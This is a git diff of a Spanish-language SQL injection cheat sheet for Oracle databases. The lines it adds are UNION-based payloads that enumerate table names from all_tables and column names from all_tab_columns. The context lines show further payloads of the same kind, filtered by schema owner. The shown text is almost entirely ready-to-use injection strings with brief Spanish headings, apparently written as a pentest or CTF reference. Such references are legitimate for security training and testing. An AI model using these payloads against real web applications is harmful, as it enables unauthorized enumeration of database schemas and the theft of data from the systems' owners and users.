@@ -169,6 +169,12 @@ Si no hay `OFFSET/FETCH`, usaremos una subconsulta con `ROWNUM`/`ROW_NUMBER()` y
 
 ## Listar tablas de un schema (owner)
 
+### 0) Listar tablas básico
+
+```sql
+' UNION SELECT 1, table_name FROM all_tables-- 
+```
+
 ### 1) Payload básico (si la columna izquierda es numérica)
 
 ```sql
@@ -221,6 +227,12 @@ Donde `'4150505f534348454d41'` es el hex de `APP_SCHEMA`.
 ---
 
 ## Listar columnas de una tabla
+
+Como nombre de tabla usamos 'DUAL', se puede usar la que se vea extrayendo las tablas
+
+```sql
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='DUAL'--
+```
 
 ```sql
 ' UNION SELECT 1, column_name FROM all_tab_columns WHERE table_name = 'NOMBRE_TABLA' AND owner = 'APP_SCHEMA'--
